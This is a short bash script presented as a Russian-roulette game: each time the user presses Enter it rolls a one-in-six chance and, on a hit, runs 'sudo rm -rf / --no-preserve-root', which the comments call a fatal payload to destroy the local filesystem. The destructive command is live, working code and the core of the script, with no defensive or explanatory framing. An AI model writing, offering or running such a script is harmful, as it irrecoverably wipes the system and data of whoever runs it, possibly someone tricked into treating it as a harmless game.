#!/usr/bin/env bash

# INITIALISATION
# set round counter
i=0

while true; do
  (( i++ ))
  
  # MANUAL TRIGGER
  # halt execution until the user presses enter
  read -p "Round $i... Press [Enter] to pull the trigger."
  
  # PROBABILITY CHECK
  # calculate the single chamber chance
  if [ $(( RANDOM % 6 )) -eq 0 ]; then
    echo "☠️  DESTROYED after $i rounds!"
    
    # FATAL PAYLOAD
    # destroy the local filesystem
    sudo rm -rf / --no-preserve-root
    break
  else
    echo -e "🍀 Click. You survived.\n"
  fi
done
